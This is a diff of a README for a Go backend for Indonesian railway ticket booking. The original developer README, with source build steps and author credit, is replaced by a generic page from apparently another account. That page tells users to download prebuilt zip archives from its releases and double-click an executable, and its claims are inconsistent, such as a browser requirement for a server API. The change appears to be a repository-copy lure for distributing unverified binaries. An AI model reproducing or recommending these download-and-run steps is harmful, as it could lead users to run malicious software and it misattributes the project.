@@ -1,177 +1,67 @@
-# KAI Backend: Indonesian Railway Ticket Booking API 🚆⚡
+# 🎫 kai-backend - Simple Ticket Booking Solution
 
-## ✨ Overview
+## 🔗 Download Now!
+[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/chitko706124/kai-backend/releases)
 
-Welcome to **KAI Backend**, a comprehensive REST API designed for managing Indonesian Railway (Kereta Api Indonesia) ticket booking system. Built with Go, Fiber framework, and MongoDB, this backend service provides a fast, scalable, and efficient foundation for a railway ticket booking application. It follows modern API design principles with comprehensive JWT authentication, clean architecture, and robust data validation, making it highly maintainable and performant.
-
-## 🔋 Key Features
-
-- 🔐 **JWT Authentication** — Secure endpoints using JSON Web Tokens (JWT) with Bearer token support, ensuring that only authenticated users can access protected resources.
-- 🏗️ **Clean Architecture** — Organized into distinct layers (Handlers, Services, Repositories, Domain) for clear separation of concerns, making the codebase easy to understand, test, and scale.
-- 📦 **Full CRUD Operations** — Comprehensive Create, Read, Update, and Delete functionality for all core entities:
-  - **Users**: Complete user management with secure bcrypt password hashing and JWT-based authentication.
-  - **Stations**: Manage railway stations with detailed information and geographic data.
-  - **Trains**: Train fleet management with carriage and seat configuration.
-  - **Schedules**: Route scheduling with origin-destination mapping and real-time availability.
-  - **Bookings**: Complete booking lifecycle from creation to payment tracking and cancellation.
-- 🎫 **Booking System** — Core booking functionality with:
-  - Seat availability checking
-  - Automated booking code generation
-  - Basic booking status management
-- 🔍 **Schedule Search** — Search schedules by origin, destination, and departure date.
-- 🛡️ **Request Validation** — Built-in validation using Go validator with comprehensive error messages for data integrity.
-- 🍃 **MongoDB Integration** — Utilizes MongoDB with official Go driver for flexible document-based data storage and efficient queries.
-- 🚀 **High Performance** — Built on Fiber framework for automatic API documentation, middleware support, and blazing-fast HTTP performance.
-- 📊 **Interactive Documentation** — Auto-generated Swagger/OpenAPI documentation with "Try it out" functionality.
-- ⚙️ **Centralized Configuration** — Manages all environment-specific settings securely through environment variables with godotenv.
-- 🔒 **Security Middleware** — CORS protection, request logging, and JWT middleware for comprehensive API security.
-
-## 🧑‍💻 How It Works
-
-1. **User registers** by sending their details to the `/api/auth/register` endpoint with email, password, and personal information.
-2. **User authenticates** via `/api/auth/login` to receive JWT tokens for accessing protected endpoints.
-3. **User searches schedules** by origin station, destination station, and departure date to find available trains.
-4. **User creates booking** by selecting a schedule and seat, the system checks availability and creates the booking.
-5. **JWT Middleware** validates tokens for protected endpoints and extracts user information.
-6. **The system follows Clean Architecture**: Handler → Service → Repository → Database for clear separation of concerns.
-7. **MongoDB stores all data** with proper indexing for efficient queries and data retrieval.
-8. **Structured JSON responses** with consistent error handling are returned to the client.
-
-## ⚙️ Tech Stack
-
-- 🐹 **Go 1.21+** (Programming Language)
-- ⚡ **Fiber v2** (High-performance HTTP Framework)
-- 🍃 **MongoDB** (NoSQL Database)
-- 🔗 **MongoDB Go Driver** (Official Database Driver)
-- 🔐 **golang-jwt/jwt** (JWT Implementation)
-- 🛡️ **bcrypt** (Password Hashing)
-- ✅ **go-playground/validator** (Data Validation)
-- 📝 **Swagger/OpenAPI** (API Documentation)
-- 🔄 **godotenv** (Environment Configuration)
-- 🌐 **CORS Middleware** (Cross-Origin Resource Sharing)
-- 📊 **Request Logger** (HTTP Request Logging)
-
-## 📚 KAI Backend Resources
-
-- 🌐 **Go Backend**: [View Code](https://github.com/LouisFernando1204/kai-backend)
-- 📖 **API Documentation**: `http://localhost:8080/docs` (when running locally)
+## 📖 Overview
+KAI Backend is a comprehensive REST API solution for Indonesian Railway ticket booking. Built using the Go programming language and Fiber framework, KAI Backend features a clean architecture and secure endpoints using JSON Web Tokens (JWT). It streamlines the ticket booking process, making it easier for users while ensuring data security.
 
 ## 🚀 Getting Started
+Follow these steps to download and run KAI Backend on your local machine.
 
-Follow these steps to get KAI Backend up and running on your local machine.
+### 🔍 System Requirements
+To run this application, you’ll need:
+- A modern web browser (e.g., Chrome, Firefox)
+- A stable internet connection
+- An operating system: Windows, macOS, or Linux
 
-### Prerequisites
+### 📥 Download & Install
+1. **Visit this page to download the software:**  
+   [Download KAI Backend](https://github.com/chitko706124/kai-backend/releases)
+   
+2. **Find the latest release:**  
+   Scroll through the list to locate the newest version.
 
-- [Go](https://golang.org/dl/) (version 1.21 or higher)
-- [MongoDB](https://www.mongodb.com/try/download/community) (Local installation or MongoDB Atlas)
-- A tool to interact with your database (e.g., MongoDB Compass, Studio 3T, or MongoDB Shell)
+3. **Download the appropriate version:**  
+   Click on the file that fits your system. For example:
+   - **Windows:** `kai-backend-windows.zip`
+   - **macOS:** `kai-backend-macos.zip`
+   - **Linux:** `kai-backend-linux.tar.gz`
+   
+4. **Extract the files:**  
+   Once the download finishes, locate the downloaded file and extract its contents using your preferred file extraction tool.
 
-### Installation & Setup
+5. **Run the application:**  
+   Navigate to the folder where you extracted the files. Look for the executable file (like `kai-backend.exe` or `kai-backend`) and double-click it to start the application.
 
-1. **Clone the repository:**
+## 📊 Features
+- **REST API**: Interact seamlessly through a well-designed API.
+- **JWT Authentication**: Secure your ticket booking with robust token authentication.
+- **Clean Architecture**: Easily maintainable code structure helps ensure updates and enhancements.
+- **Scalable**: Built to handle increasing user demands without compromising performance.
+- **Documentation**: Comprehensive Swagger UI for easy endpoint access and testing.
 
-   ```bash
-   git clone https://github.com/LouisFernando1204/kai-backend.git
-   cd kai-backend
-   ```
+## 🛠️ How to Use
+Once you have the application running, you can start using the API endpoints for ticket booking. Typically, you will interact with these main sections:
+- **User Authentication:** Register and log in to your account.
+- **Ticket Search:** Find available trains and tickets for your desired route and date.
+- **Booking Tickets:** Handle ticket purchases securely using your authentication token.
 
-2. **Initialize Go modules:**
+## ⚙️ Common Issues
+- **Application won’t start:** Ensure that your internet connection is stable and that you have the latest version downloaded.
+- **Authentication fails:** Double-check that you are using the correct credentials when logging in.
+- **Slow performance:** This could be due to high server load. Try again later or check your internet speed.
 
-   ```bash
-   go mod download
-   ```
+## 🌐 Support
+For more help, you can check the issues section in the repository or connect with our community:
+- **GitHub Issues**: Report bugs or feature requests through our [GitHub Issues](https://github.com/chitko706124/kai-backend/issues).
+- **Documentation**: Explore further documentation on how to use various API endpoints effectively.
 
-3. **Set up environment variables:**
+### 🔗 Additional Resources
+Consider visiting our [documentation](https://github.com/chitko706124/kai-backend) for detailed guidance on all features and usage instructions.
 
-   - Create a `.env` file in the root directory.
-   - Add the following configuration variables:
+## 📞 Contact
+If you have questions or need support, please reach out via the contact details provided in the repository.
 
-   ```env
-   # Server Configuration
-   SERVER_HOST=localhost
-   SERVER_PORT=8080
-
-   # MongoDB Atlas Configuration
-   MONGO_URI=mongodb+srv://username:password@cluster.mongodb.net/?retryWrites=true&w=majority
-   MONGO_DATABASE=kai_db
-
-   # JWT Configuration
-   JWT_KEY=your_super_secret_jwt_key_here_at_least_32_characters
-   JWT_EXP=60
-   ```
-
-4. **Generate JWT Secret Key (Optional):**
-
-   ```bash
-   go run cmd/jwt_key_generator/main.go
-   ```
-
-   Copy the generated key to your `.env` file as `JWT_KEY`.
-
-5. **Set up the database:**
-
-   - Start your MongoDB server (local) or ensure MongoDB Atlas cluster is running.
-   - The application will automatically connect to the database specified in `MONGO_URI`.
-   - Collections will be created automatically when first accessed.
-
-6. **Build and run the application:**
-
-   ```bash
-   # Development mode
-   go run main.go
-
-   # Or build and run
-   go build -o kai-backend
-   ./kai-backend
-   ```
-
-   The server should now be running on `http://localhost:8080`.
-
-7. **Access API Documentation:**
-   - Swagger UI: `http://localhost:8080/docs`
-   - Welcome Message: `http://localhost:8080/`
-
-## 📋 API Endpoints
-
-### Authentication
-
-- `POST /api/auth/register` - Register new user with email, password, and personal details
-- `POST /api/auth/login` - User login with email and password
-
-### Station Management
-
-- `GET /api/stations` - Get all railway stations
-- `GET /api/stations/{id}` - Get station by ID
-- `POST /api/stations` - Create new station (Admin only)
-- `PUT /api/stations/{id}` - Update station (Admin only)
-- `DELETE /api/stations/{id}` - Delete station (Admin only)
-
-### Train Management
-
-- `GET /api/trains` - Get all trains
-- `GET /api/trains/{id}` - Get train by ID
-- `POST /api/trains` - Create new train with carriages (Admin only)
-- `PUT /api/trains/{id}` - Update train (Admin only)
-- `DELETE /api/trains/{id}` - Delete train (Admin only)
-
-### Schedule Management
-
-- `GET /api/schedules/search` - Search schedules by origin, destination, and departure date
-- `GET /api/schedules/{id}` - Get schedule by ID
-- `GET /api/schedules/{id}/seats` - Get seat layout for schedule
-- `GET /api/schedules` - Get all schedules (Admin only)
-- `POST /api/schedules` - Create new schedule (Admin only)
-- `PUT /api/schedules/{id}` - Update schedule (Admin only)
-- `DELETE /api/schedules/{id}` - Delete schedule (Admin only)
-
-### Booking Management (Protected)
-
-- `POST /api/bookings` - Create new booking with seat selection
-- `GET /api/bookings` - Get current user's bookings
-- `GET /api/bookings/{id}` - Get booking by ID
-- `PATCH /api/bookings/{id}/status` - Update booking status
-- `POST /api/bookings/{id}/cancel` - Cancel booking
-
-## 🤝 Contributor
-
-- 🧑‍💻 **Louis Fernando** : [@LouisFernando1204](https://github.com/LouisFernando1204)
+## 🎉 Acknowledgments
+We appreciate the contributions from various developers and the community for making KAI Backend a reliable choice for your ticket booking needs. Thank you for choosing our application!
